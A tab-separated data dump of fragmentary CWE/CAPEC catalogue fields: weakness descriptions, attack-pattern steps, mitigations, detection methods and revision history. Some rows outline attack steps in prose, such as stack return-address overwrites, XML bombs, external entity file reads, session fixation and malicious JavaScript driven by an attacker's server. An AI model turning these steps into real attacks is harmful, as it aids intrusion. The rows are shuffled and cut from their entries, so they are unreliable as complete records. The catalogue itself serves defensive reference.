23294	62	updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships
18142	81	Access Control
10858	46	As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.
15534	28	Eric Dalci
19658	76	2019-04-04
9908	39	2010-02-16
19429	35	Cigital
25283	62	updated Potential_Mitigations
9670	78	Low
16416	58	There are generally several security-critical data on an execution stack that can lead to arbitrary code execution. The most prominent is the stored return address, the memory address at which execution should continue once the current function is finished executing. The attacker can overwrite this value with some memory address to which the attacker also has write access, into which they place arbitrary code to be run with the full privileges of the vulnerable program. Alternately, the attacker can supply the address of an important call, for instance the POSIX system() call, leaving arguments to the call on the stack. This is often called a return into libc exploit, since the attacker generally forces the program to jump at return time into an interesting routine in the C standard library (libc). Other important data commonly on the stack include the stack pointer and frame pointer, two values that indicate offsets for computing memory addresses. Modifying those values can often be leveraged into a "write-what-where" condition.
8864	103	Primary
9282	84	22
21993	39	2017-11-08
20957	28	Eric Dalci
15819	35	MITRE
10769	28	CWE Content Team
6608	97	Peripheral Footprinting
21288	28	CWE Content Team
15692	88	Missing Validation of OpenSSL Certificate
8245	35	MITRE
17294	101	CAPEC Content Team
13654	39	2012-05-11
20374	35	MITRE
17154	103	Primary
10221	35	MITRE
25321	77	Dynamic Analysis with Automated Results Interpretation
14786	28	Eric Dalci
23744	94	Information Leakage
7409	76	2017-01-09
7592	71	2012
23555	102	ChildOf
16052	28	CWE Content Team
17129	28	CWE Content Team
10496	95	[Modify cookie to subvert security controls.] The adversary may be able to modify or replace cookies to bypass security controls in the application.
21880	91	Implementation
13026	28	CWE Content Team
8035	91	Implementation
10453	28	CWE Content Team
20244	28	CWE Content Team
18539	39	2017-11-08
9128	39	2015-12-07
9082	55	CAPEC Content Team
21841	39	2011-03-29
10315	56	ChildOf
23994	31	1000
13303	94	An attacker may leverage local code inclusion in order to print sensitive data to a page, such as hidden configuration files or or password hashes.
22139	49	2003
9007	62	updated Time_of_Introduction
12606	62	updated Relationships, Taxonomy_Mappings
15403	39	2008-07-01
24940	90	Java
16407	72	Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
15176	28	CWE Content Team
16144	91	Implementation
25349	91	Implementation
23501	63	Read Memory
17163	93	High
23130	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
18497	62	updated Enabling_Factors_for_Exploitation, Modes_of_Introduction, References, Taxonomy_Mappings
20017	28	CWE Content Team
19130	35	MITRE
18023	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
6994	35	MITRE
14686	79	Integrity
8384	39	2009-07-17
11236	69	Draft
19041	78	High
15359	56	ChildOf
6742	100	The MITRE Corporation
18031	62	updated Potential_Mitigations
22373	62	updated Description, Other_Notes
23070	59	Updated Attack_Phases, Description, Description Summary, Related_Weaknesses
7020	81	Other
17973	78	High
22618	100	The MITRE Corporation
19753	77	Manual Static Analysis - Source Code
23216	94	An attacker could verify that the target is in (or not in) a given location.
24275	39	2009-03-10
25237	35	MITRE
15932	91	Implementation
12233	78	Medium
19464	61	Draft
7444	56	PeerOf
5937	103	Primary
5614	28	CWE Content Team
22279	56	CanPrecede
14987	62	updated Common_Consequences, Observed_Examples, References, Relationships
11927	39	2011-03-29
25273	43	Simple
18694	56	ChildOf
13274	101	CAPEC Content Team
18084	36	http://projects.webappsec.org/w/page/13246952/Path-Traversal
8612	23	Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an adversary to inject data that may have an adverse effect on the XML parser when it is being processed. By supplying oversized payloads in input vectors that will be processed by the XML parser, an adversary can cause the XML parser to consume more resources while processing, causing excessive memory consumption and CPU utilization, and potentially cause execution of arbitrary code. An adversary's goal is to leverage parser failure to his or her advantage. In many cases this type of an attack will result in a XML Denial of Service (XDoS) due to an application becoming unstable, freezing, or crashing. However it is possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [R.231.1]. XDoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious XML payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. The main weakness in XDoS is that the service provider generally must inspect, parse, and validate the XML messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that XDoS targets. This attack exploits the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends.
10667	39	2014-02-18
9676	59	Updated Related_Attack_Patterns
13706	62	updated Time_of_Introduction
19419	28	CWE Content Team
11451	62	updated Weakness_Ordinalities
18928	62	updated Relationships
16071	103	Primary
19488	79	Authorization
17326	46	Typically, a product defines its control sphere within the code itself, or through configuration by the product's administrator. In some cases, an external party can change the definition of the control sphere. This is typically a resultant weakness.
18900	23	The attacker induces a client to establish a session with the target software using a session identifier provided by the attacker. Once the user successfully authenticates to the target software, the attacker uses the (now privileged) session identifier in their own transactions. This attack leverages the fact that the target software either relies on client-generated session identifiers or maintains the same session identifiers after privilege elevation.
14580	53	The MITRE Corporation
6476	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).
14820	72	Each thread of execution will "hang" and prevent tasks from completing. In some cases, CPU consumption may occur if a lock check occurs in a tight loop.
19692	61	Stable
7316	100	The MITRE Corporation
7899	51	2014-06-23
19985	55	CAPEC Content Team
12793	39	2009-07-27
12088	35	MITRE
10712	56	CanAlsoBe
22167	62	updated Relationships, Taxonomy_Mappings
14124	69	Incomplete
10848	62	updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
7053	88	Reliance on IP Address for Authentication
8795	35	MITRE
24042	21	CLASP
17803	54	High
22421	63	Modify Application Data
8640	62	updated Description
25194	63	Bypass Protection Mechanism
11859	101	CAPEC Content Team
20087	35	MITRE
5618	100	The MITRE Corporation
18249	62	updated Common_Consequences, References, Relationships
8538	62	updated Relationships, Taxonomy_Mappings
16013	91	Architecture and Design
24659	39	2008-09-08
10674	39	2011-03-29
9055	39	2014-07-30
13516	92	Experiment
11596	23	When an application exposes a remote interface for an entity bean, it might also expose methods that get or set the bean's data. These methods could be leveraged to read sensitive information, or to change data in ways that violate the application's expectations, potentially leading to other vulnerabilities.
22710	56	PeerOf
23313	79	Integrity
14658	42	Drop privileges before invoking such functions, if possible.
18116	100	The MITRE Corporation
16550	103	Primary
19110	39	2008-09-08
19440	96	2008-01-18
21143	39	2011-03-29
6714	39	2012-05-11
19005	28	CWE Content Team
17725	28	Eric Dalci
9312	31	1000
8693	62	updated Relationships
21643	39	2009-10-29
20869	31	1000
20386	35	MITRE
20361	52	Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic
17180	28	CWE Content Team
16415	35	MITRE
24710	72	Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
15150	79	Access Control
20067	62	updated Description, Name
8822	28	CWE Content Team
13813	43	Simple
10867	46	An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance.
21459	28	CWE Content Team
24992	48	10
8248	42	Eliminate the usage of non-reentrant functionality inside of signal handlers. This includes replacing all non-reentrant library calls with reentrant calls.                   Note: This will not always be possible and may require large portions of the software to be rewritten or even redesigned. Sometimes reentrant-safe library alternatives will not be available. Sometimes non-reentrant interaction between the state of the system and the signal handler will be required by design.
25206	62	updated Demonstrative_Examples, Modes_of_Introduction, Relationships, Type
7764	88	Inadequate Encryption Strength
25272	91	Implementation
9807	62	updated Relationships
16583	25	High
18269	39	2012-05-11
18130	62	updated Type
22563	28	CWE Content Team
20638	35	MITRE
14352	35	MITRE
22510	39	2012-05-11
13235	79	Confidentiality
18102	35	MITRE
10006	21	CWE Content Team
20842	50	Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format.
14152	28	CWE Content Team
5994	35	MITRE
21493	39	2011-06-01
14063	56	ChildOf
23293	56	ChildOf
7713	43	Simple
18349	62	updated Related_Attack_Patterns
15594	39	2011-06-01
17327	62	updated Relationships, Taxonomy_Mappings
16154	35	MITRE
5627	33	Jim Manico
9760	39	2012-10-30
25045	100	The MITRE Corporation
10303	51	2014-06-23
8351	39	2012-05-11
12120	50	Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.
14067	56	ChildOf
5708	62	updated Taxonomy_Mappings
13128	100	The MITRE Corporation
9761	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
12659	95	[Create Session IDs.] Attackers craft messages containing their forged credentials in GET, POST request, HTTP headers or cookies.
16331	35	MITRE
7200	35	MITRE
21304	28	CWE Content Team
15562	89	Detailed
24217	39	2018-03-27
16230	28	CWE Content Team
13618	62	updated Alternate_Terms, Demonstrative_Examples, Description, References
18340	73	Attackers can put links on web sites (such as forums, blogs, or comment forms).
21864	101	CAPEC Content Team
21824	80	Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.
22129	39	2010-06-21
17889	43	Simple
12953	56	ChildOf
14672	50	Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.
11742	62	updated Potential_Mitigations
22538	39	2019-01-03
14349	101	CAPEC Content Team
6895	62	updated Common_Consequences
25338	28	CWE Content Team
13440	35	MITRE
21941	35	MITRE
10701	46	This issue can prevent the software from running reliably due to undefined or unexpected behaviors.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
23268	28	CWE Content Team
6544	33	Dinis Cruz
6070	95	[Run rainbow table-based password cracking tool] An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.
14468	72	Data injection attacks lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing.
19961	79	Other
6655	39	2009-03-10
24427	50	Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.
24105	62	updated Observed_Examples, Relationships
19184	59	Updated Related_Attack_Patterns
17677	31	1000
24501	62	updated Related_Attack_Patterns
7469	63	Bypass Protection Mechanism
16433	28	CWE Content Team
23254	33	Robert C. Seacord
17293	40	Targeted software is utilizing application framework APIs
9764	63	Read Application Data
22701	85	610
19670	28	Eric Dalci
9346	40	The targeted program has a vulnerability such as buffer overflow which may be exploited if a malicious user can inject unvalidated data. For instance a buffer overflow interrupts the program as it executes, and makes it run additional code supplied by the attacker. If the program under attack has elevated privileges to the OS, the attacker can elevate its privileges (such as having root level access).
8747	47	Modify Data
21033	66	Portably Solving File TOCTTOU Races with Hardness Amplification
19382	28	CWE Content Team
8703	39	2018-03-27
15260	62	updated Applicable_Platforms
10282	35	MITRE
12929	62	updated Relationships
25004	23	The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.
22316	43	Simple
10283	50	Design: Fix the Windows loading process to eliminate the preferential search order by looking for DLLs in the precise location where they are expected                Design: Sign system DLLs so that unauthorized DLLs can be detected.
16056	39	2008-07-01
11534	62	updated Relationships
10743	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site
12562	59	Updated Resources_Required
10549	53	The MITRE Corporation
23243	59	Updated Attack_Prerequisites, Resources_Required
19982	97	Web Services Protocol Manipulation
15501	69	Incomplete
16840	62	updated Description
21697	81	Confidentiality
24562	35	MITRE
22269	103	Primary
24044	86	http://www.analyticalengine.net/archives/58
12995	56	ChildOf
17639	45	Variant
16390	39	2013-02-21
24009	92	Experiment
18735	39	2008-09-08
9740	102	ChildOf
12565	63	Bypass Protection Mechanism
22043	23	The web application does not adequately enforce appropriate authorization on all restricted URLs, scripts, or files.
20807	81	Other
20882	45	Variant
22199	62	updated Demonstrative_Examples
17928	45	Variant
19320	69	Draft
20249	46	Improper encoding or escaping can allow attackers to change the commands that are sent to another component, inserting malicious commands instead.             Most software follows a certain protocol that uses structured messages for communication between components, such as queries or commands. These structured messages can contain raw data interspersed with metadata or control information. For example, "GET /index.html HTTP/1.1" is a structured message containing a command ("GET") with a single argument ("/index.html") and metadata about which protocol version is being used ("HTTP/1.1").             If an application uses attacker-supplied inputs to construct a structured message without properly encoding or escaping, then the attacker could insert special characters that will cause the data to be interpreted as control information or metadata. Consequently, the component that receives the output will perform the wrong operations, or otherwise interpret the data incorrectly.
23550	73	View source of web page to find hidden fields
9103	104	229
20264	62	updated Applicable_Platforms
18077	35	MITRE
17861	62	updated Potential_Mitigations
10272	28	CWE Content Team
15442	28	CWE Content Team
7559	28	CWE Content Team
17306	28	CWE Content Team
6522	28	CWE Content Team
13788	91	Architecture and Design
20049	90	Java
17365	28	CWE Content Team
11587	28	CWE Content Team
12360	43	Simple
12123	35	MITRE
18568	39	2008-09-08
23788	39	2017-05-03
15988	31	1000
21318	62	updated Common_Consequences
24885	28	CWE Content Team
12473	35	MITRE
11734	35	MITRE
17030	35	MITRE
20959	76	2018-07-31
25080	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
13493	42	Developers should anticipate that substitution characters will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
22077	69	Incomplete
10173	43	Simple
14229	62	updated Description, Other_Notes
17430	31	1000
8458	90	Java
22249	62	updated Potential_Mitigations
9393	81	Other
20412	50	Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.
15156	39	2017-11-08
8458	104	491
15594	62	updated Common_Consequences
12187	89	Detailed
21976	62	added/updated demonstrative examples
12598	61	Draft
15804	35	Cigital
21712	28	CWE Content Team
9301	31	1000
11313	28	CWE Content Team
8726	73	Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.
12282	76	2018-07-31
23246	26	Architecture and Design
21323	35	MITRE
10707	28	CWE Content Team
23388	28	Eric Dalci
11570	39	2008-07-01
24033	73	Use a spider, for web applications, to create a list of URLs and associated inputs.
5696	31	699
20432	62	updated Relationships, Taxonomy_Mappings
7817	62	updated Time_of_Introduction
12521	35	MITRE
17110	35	MITRE
23580	79	Confidentiality
24177	39	2011-09-13
10391	39	2014-07-30
16691	42	Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").
15083	62	updated Relationships, Other_Notes, Taxonomy_Mappings
20573	24	MITRE
11609	62	updated Modes_of_Introduction, Relationships
12428	56	CanAlsoBe
23915	40	The target must follow external entity references without validating the validity of the reference target.
5632	39	2012-10-30
17292	69	Draft
12481	28	CWE Content Team
7784	35	Cigital
10755	86	http://blog.didierstevens.com/2008/09/23/dismantling-an-xml-bomb/
21542	56	ChildOf
15713	39	2010-02-16
6844	35	Cigital
16210	39	2014-07-30
24093	91	System Configuration
20844	88	Private Data Structure Returned From A Public Method
7448	31	699
24947	73	Send the malicious crafted XML message containing the reference to a senstive file to the target URL.
8554	79	Access Control
22918	101	CAPEC Content Team
17317	28	CWE Content Team
13582	81	Integrity
23444	46	The HTTP GET method and some other methods are designed to retrieve resources and not to alter the state of the application or resources on the server side. Furthermore, the HTTP specification requires that GET requests (and other requests) should not have side effects. Believing that it will be enough to prevent unintended resource alterations, an application may disallow the HTTP requests to perform DELETE, PUT and POST operations on the resource representation. However, there is nothing in the HTTP protocol itself that actually prevents the HTTP GET method from performing more than just query of the data. Developers can easily code programs that accept a HTTP GET request that do in fact create, update or delete data on the server. For instance, it is a common practice with REST based Web Services to have HTTP GET requests modifying resources on the server side. However, whenever that happens, the access control needs to be properly enforced in the application. No assumptions should be made that only HTTP DELETE, PUT, POST, and other methods have the power to alter the representation of the resource being accessed in the request.
9436	53	The MITRE Corporation
13276	39	2018-03-27
10858	90	Language-Independent
23918	51	2014-06-23
7297	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
19406	62	updated Demonstrative_Examples
16807	76	2018-07-31
18498	81	Integrity
8311	62	clarified description, provided background details, and added demonstrative example
10215	26	Implementation
23482	62	updated Taxonomy_Mappings
6421	28	Eric Dalci
6451	39	2017-01-19
16688	40	A vulnerable DBMS is usedA SQL injection exists that gives an attacker access to the database or an attacker has access to the DBMS via other means
19009	103	Primary
22979	74	5
20489	35	MITRE
10977	28	CWE Content Team
23373	28	CWE Content Team
7674	62	updated Relationships
8626	35	MITRE
13452	62	updated Potential_Mitigations, Time_of_Introduction
12398	88	Improper Neutralization of Invalid Characters in Identifiers in Web Pages
20131	62	updated Potential_Mitigations, Relationships
10117	28	CWE Content Team
7393	104	457
6587	51	2014-06-23
19616	53	The MITRE Corporation
14290	39	2014-07-30
18218	69	Incomplete
17671	39	2012-05-11
10144	85	159
18707	46	This issue makes it more difficult to maintain and/or port the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
12778	62	updated Relationships
22876	39	2008-11-05
15445	28	CWE Content Team
14561	53	The MITRE Corporation
7673	28	CWE Content Team
7850	62	updated Relationships, Taxonomy_Mappings
13972	62	updated Potential_Mitigations, Time_of_Introduction
24389	104	285
9756	39	2014-06-23
6643	76	2015-12-07
13635	32	Addison-Wesley
17207	39	2011-06-01
16534	35	MITRE
24435	54	High
16340	26	Implementation
16172	86	http://www.securityfocus.com/infocus/1822
24301	28	CWE Content Team
24642	86	http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.147.1445
7614	85	250
14385	97	Disabling Network Hardware
10345	51	2015-11-09
14260	88	Premature Release of Resource During Expected Lifetime
20459	50	Administrators should disable support for HTTP TRACE at the destination's web server. Vendors should disable TRACE by default.
22789	21	CLASP
8202	39	2019-06-20
16560	56	ChildOf
9769	43	Simple
12819	91	Build and Compilation
24080	35	MITRE
21192	62	updated Potential_Mitigations
16716	91	Implementation
15657	39	2008-09-08
12337	100	The MITRE Corporation
23727	90	Language-Independent
15795	35	MITRE
13986	103	Primary
15524	81	Confidentiality
14268	73	The attacker reverse engineers client-side code to identify the functionality that the server relies on for the proper or secure operation.
14870	39	2017-11-08
23007	35	MITRE
18244	62	updated Relationships
6218	89	Detailed
5699	101	CAPEC Content Team
19820	76	2018-07-31
10245	39	2017-01-19
15199	92	Experiment
18600	85	415
11183	85	629
18739	59	Updated Resources_Required
8404	100	The MITRE Corporation
10649	72	If privileges are not dropped, in some cases the system may record actions as the user which is being impersonated rather than the impersonator.
20837	91	Architecture and Design
10822	63	Gain Privileges or Assume Identity
14363	35	MITRE
15798	35	MITRE
13090	91	Architecture and Design
9899	39	2017-11-08
7011	39	2011-06-01
14744	28	CWE Content Team
24849	91	Architecture and Design
15538	103	Primary
8075	49	2002
19066	80	This attack requires advanced knoweldge in GPS technology.
18916	39	2009-05-27
11026	28	CWE Content Team
10123	35	MITRE
14103	91	Implementation
17794	28	CWE Content Team
25430	42	Use encryption in order to make it more difficult to guess other legitimate values of the key or associate a digital signature with the key so that the server can verify that there has been no tampering.
22339	85	651
15594	28	CWE Content Team
11063	39	2018-03-27
11231	62	updated Relationships, Taxonomy_Mappings
15208	28	CWE Content Team
25033	28	CWE Content Team
21198	39	2011-06-01
8351	35	MITRE
23388	35	Cigital
9658	44	High
9220	39	2012-10-30
8890	81	Integrity
14582	56	ChildOf
22244	56	ChildOf
11508	79	Confidentiality
19401	28	CWE Content Team
9249	94	Run Arbitrary Code
17108	91	Architecture and Design
13542	55	CAPEC Content Team
14074	100	The MITRE Corporation
22605	39	2008-07-01
7405	88	Path Traversal: '....' (Multiple Dot)
18958	39	2008-07-01
11202	102	ChildOf
10318	81	Integrity
21287	39	2014-06-23
10755	33	Didier Stevens
9245	39	2012-05-11
14206	46	Although this weakness can occur with any type of resource, it is frequently introduced when a product uses a directory search path to find executables or code libraries, but the path contains a directory that can be modified by an attacker, such as "/tmp" or the current working directory.             In Windows-based systems, when the LoadLibrary or LoadLibraryEx function is called with a DLL name that does not contain a fully qualified path, the function follows a search order that includes two path elements that might be uncontrolled:                                                the directory from which the program has been loaded                   the current working directory.                                          In some cases, the attack can be conducted remotely, such as when SMB or WebDAV network shares are used.             In some Unix-based systems, a PATH might be created that contains an empty element, e.g. by splicing an empty variable into the PATH. This empty element can be interpreted as equivalent to the current working directory, which might be an untrusted search element.
19631	28	CWE Content Team
22033	35	MITRE
21845	31	1000
24440	45	Variant
20041	101	CAPEC Content Team
5591	62	updated Time_of_Introduction
13040	95	Attacker sets up a system mocking the one trusted by the users. This is usually a website that requires or handles sensitive information.
25265	62	updated Potential_Mitigations
22988	63	Modify Files or Directories
24000	39	2011-06-01
19512	103	Primary
23680	39	2014-06-23
23622	104	110
12631	26	Implementation
24136	62	updated Relationships
9346	40	The targeted program does not fail safely. For instance when a program fails it may authorize restricted access to anyone.
7762	62	updated Name
25225	35	MITRE
13992	61	Draft
9163	35	MITRE
12752	31	1000
15283	85	199
12439	45	Variant
15372	39	2014-07-30
21586	61	Draft
9408	62	updated Potential_Mitigations, Related_Attack_Patterns
19035	45	Variant
10078	28	CWE Content Team
21258	35	MITRE
12366	92	Experiment
9260	91	Implementation
15129	39	2013-02-21
12872	81	Integrity
18619	39	2010-04-05
14535	31	1000
17254	49	2006
8942	50	Properly handle Null characters. Make sure canonicalization is properly applied. Do not pass Null characters to the underlying APIs.
10763	53	The MITRE Corporation
7961	62	updated Relationships, Taxonomy_Mappings
20477	40	An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.
6413	28	CWE Content Team
20648	35	MITRE
24371	21	CWE Content Team
22752	28	CWE Content Team
22318	62	updated Demonstrative_Examples
12509	63	DoS: Resource Consumption (Memory)
21825	63	Execute Unauthorized Code or Commands
5936	40	The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal users
8359	101	CAPEC Content Team
17147	45	Base
9526	28	CWE Content Team
22957	81	Confidentiality
6848	94	Depending on the type of code executed by the adversary, the consequences of this attack pattern can vary widely.
7425	35	MITRE
9066	81	Confidentiality
22421	81	Confidentiality
15010	62	updated Relationships
23932	28	CWE Content Team
21864	59	Updated Related_Attack_Patterns
19179	70	Secure programmer: Prevent race conditions
14427	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Attack Modeling
16624	97	TCP Initial Window Size Probe
15511	28	CWE Content Team
21627	35	MITRE
25302	80	To overwrite/modify targeted cache
23637	39	2012-05-11
6867	35	MITRE
19449	56	ChildOf
17665	39	2011-03-29
16325	28	CWE Content Team
16833	92	Exploit
20725	91	Implementation
14957	28	CWE Content Team
12567	50	Design: IP Pinning causes browsers to record the IP address to which a given name resolves and continue using this address regardless of the TTL set in the DNS response. Unfortunately, this is incompatible with the design of some legitimate sites.
22132	81	Integrity
16508	35	MITRE
12827	39	2009-10-29
24842	31	699
12577	100	The MITRE Corporation
23361	39	2019-01-03
14264	62	updated References, Relationships
18506	39	2008-10-14
10481	101	CAPEC Content Team
20987	62	updated Other_Notes, Terminology_Notes
21798	35	MITRE
13480	55	CAPEC Content Team
21933	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.
22941	35	MITRE
21055	78	Low
6751	39	2011-06-01
6649	35	MITRE
18791	35	MITRE
10056	42	Programming languages and supporting technologies might be chosen which are not subject to these issues.
17311	72	In very rare circumstances and environments, code execution is possible.
9165	28	CWE Content Team
21878	57	Indirect
20238	56	CanPrecede
9440	79	Access Control
15220	77	Architecture or Design Review
17541	78	Low
22606	62	updated Common_Consequences, Detection_Factors, Potential_Mitigations, References
10590	85	114
13914	62	updated Common_Consequences, Demonstrative_Examples, Relationships
10573	28	CWE Content Team
11880	57	Indirect
12141	79	Access Control
24908	23	Catching NullPointerException should not be used as an alternative to programmatic checks to prevent dereferencing a null pointer.
23551	39	2017-11-08
10200	39	2017-01-19
16854	28	CWE Content Team
10209	28	CWE Content Team
19923	50	When client input is required from web-based forms, avoid using the "GET" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the "POST method whenever possible.
21361	50	Implementation: Use type conversions such as JDBC prepared statements.
6235	76	2019-09-30
17611	59	Updated @Abstraction
22276	81	Integrity
14018	28	Eric Dalci
11255	35	MITRE
15526	70	Attribute-Based Cross-Site Scripting
9569	28	CWE Content Team
22612	35	MITRE
9948	62	updated Potential_Mitigations
7508	62	updated References
11039	28	CWE Content Team
25377	96	2011-03-22
19954	49	2016
19993	56	CanPrecede
17326	69	Draft
16511	35	MITRE
19025	62	updated Relationships
15424	35	MITRE
22978	77	Manual Analysis
24934	62	updated Modes_of_Introduction, Relationships
18963	39	2018-03-27
21296	47	Hide Activities
7242	101	CAPEC Content Team
13170	91	Operation
18709	99	Addison-Wesley
23375	88	Information Exposure Through Process Environment
24205	39	2012-05-11
14813	28	CWE Content Team
24097	43	Simple
22250	28	CWE Content Team
15389	35	MITRE
12116	35	MITRE
21782	36	https://www.rfc-editor.org/rfc/rfc1858.txt
12017	28	CWE Content Team
23154	40	An application that leverages a client-side web browser with scripting enabled.
14708	103	Primary
12634	101	CAPEC Content Team
15937	28	CWE Content Team
15581	28	CWE Content Team
10202	28	CWE Content Team
16781	48	11
13343	39	2014-02-18
22454	72	If an attacker can gain access to the hashes, then the lack of sufficient computational effort will make it easier to conduct brute force attacks using techniques such as rainbow tables, or specialized hardware such as GPUs, which can be much faster than general-purpose CPUs for computing hashes.
24679	62	updated Common_Consequences, Demonstrative_Examples, Potential_Mitigations
18788	97	DNS Blocking
6534	39	2008-09-08
22265	63	Modify Files or Directories
21143	28	CWE Content Team
17743	79	Authorization
15619	62	Suggested OWASP Top Ten 2004 mapping
7778	28	CWE Content Team
6871	74	3
8220	28	CWE Content Team
10782	97	Remote Code Inclusion
8935	39	2010-12-13
13306	35	MITRE
25442	86	http://www.owasp.org/index.php/ESAPI
15860	56	ChildOf
15620	81	Access Control
22501	42	Omitting a break statement so that one may fall through is often indistinguishable from an error, and therefore should be avoided. If you need to use fall-through capabilities, make sure that you have clearly documented this within the switch statement, and ensure that you have examined all the logical possibilities.
13640	95	[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.
10215	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
20247	32	The Open Web Application Security Project (OWASP)
20138	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
7435	62	updated Relationships
10869	62	updated Relationships
20507	28	CWE Content Team
14888	88	Missing Handler
16868	47	Hide Activities
17528	57	Indirect
10647	35	MITRE
22115	63	Modify Application Data
22933	103	Primary
22655	74	4
21380	62	updated Relationships
15499	28	CWE Content Team
20465	28	CWE Content Team
13775	35	MITRE
18179	63	Execute Unauthorized Code or Commands
6036	35	MITRE
11606	35	MITRE
8932	21	7 Pernicious Kingdoms
12288	40	User-controllable input that is not properly validated by the application as part of SQL queries.
9762	42	When using a language that does not require explicit declaration of variables, run or compile the software in a mode that reports undeclared or unknown variables. This may indicate the presence of a typographic error in the variable's name.
11836	35	MITRE
17826	74	1
21154	28	CWE Content Team
16874	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
18067	39	2010-04-05
24830	51	2014-06-23
14252	28	CWE Content Team
9130	101	CAPEC Content Team
9973	100	The MITRE Corporation
13088	35	MITRE
22941	28	CWE Content Team
16611	92	Experiment
6406	56	PeerOf
14084	35	MITRE
14012	28	Eric Dalci
15323	103	Primary
8135	39	2012-05-11
15214	103	Primary
19337	31	699
11676	28	CWE Content Team
6146	62	updated Observed_Examples, Relationships
25345	21	PLOVER
19878	101	CAPEC Content Team
9401	51	2014-06-23
23134	94	Run Arbitrary Code
12190	59	Updated References
24616	62	updated Demonstrative_Examples, Related_Attack_Patterns, Relationships
15400	39	2010-02-16
12222	28	CWE Content Team
11383	62	updated Time_of_Introduction
24407	31	1003
22780	81	Other
13965	31	699
15917	88	J2EE Framework: Saving Unserializable Objects to Disk
10121	50	Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.
10874	89	Detailed
18680	103	Primary
6903	62	updated Applicable_Platforms, Taxonomy_Mappings
18600	61	Draft
16021	54	High
15929	91	Architecture and Design
25255	56	ChildOf
20661	74	2
22618	101	CAPEC Content Team
21915	28	CWE Content Team
7050	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
15516	62	updated Demonstrative_Examples
